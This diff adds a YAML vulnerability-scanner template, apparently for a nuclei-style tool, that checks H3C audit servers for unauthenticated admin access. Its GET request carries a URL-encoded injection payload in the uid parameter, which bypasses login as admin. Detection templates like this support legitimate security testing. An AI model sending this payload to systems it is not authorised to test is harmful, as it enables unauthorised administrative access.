@@ -1,0 +1,24 @@
+id: unauthorized-h3csecparh-login
+name: H3C Server - Unauthenticated Access
+severity: high
+confidence: confirmed
+description: H3C server was able to be accessed with no authentication requirements in place.
+tags:
+- h3c
+- default-login
+- unauth
+- misconfig
+- vuln
+requests:
+- method: GET
+  path: /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin
+  matchers:
+  - type: body
+    words:
+    - admin
+    - 审计管理员
+    - 错误的id
+  - type: status
+    status:
+    - 200
+  condition: and
